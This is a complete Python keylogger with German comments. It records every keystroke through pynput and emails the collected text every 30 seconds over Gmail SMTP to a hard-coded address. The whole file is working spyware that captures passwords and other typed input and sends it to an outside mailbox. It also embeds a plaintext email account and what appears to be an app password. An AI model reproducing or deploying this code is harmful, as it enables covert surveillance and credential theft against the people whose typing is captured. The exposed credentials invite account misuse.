import smtplib
from email.mime.text import MIMEText
from pynput import keyboard
import threading
import time

# Konfiguration
EMAIL_ADDRESS = 'kowalewskifabian@gmail.com'
EMAIL_PASSWORD = 'onne gbfb jnkb cnhe'
RECIPIENT_EMAIL = 'kowalewskifabiann@gmail.com'
INTERVAL = 30  # 30 Sekunden

# Liste zur Speicherung der Tastatureingaben
keylog = []

# Funktion zum Senden der E-Mail
def send_email(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
        print("E-Mail erfolgreich gesendet.")
    except Exception as e:
        print(f"Fehler beim Senden der E-Mail: {e}")

# Funktion zum Aufzeichnen der Tastatureingaben
def on_press(key):
    try:
        keylog.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keylog.append(" ")
        elif key == keyboard.Key.enter:
            keylog.append("\n")
        else:
            keylog.append(f"[{key}]")

# Funktion zum periodischen Senden der aufgezeichneten Daten
def periodic_send():
    while True:
        time.sleep(INTERVAL)
        if keylog:
            send_email("Keylogger Bericht", "".join(keylog))
            keylog.clear()

# Starten des Keyloggers
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Starten des Threads für das periodische Senden
threading.Thread(target=periodic_send).start()

# Hauptprogramm in einer Endlosschleife laufen lassen
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    listener.stop()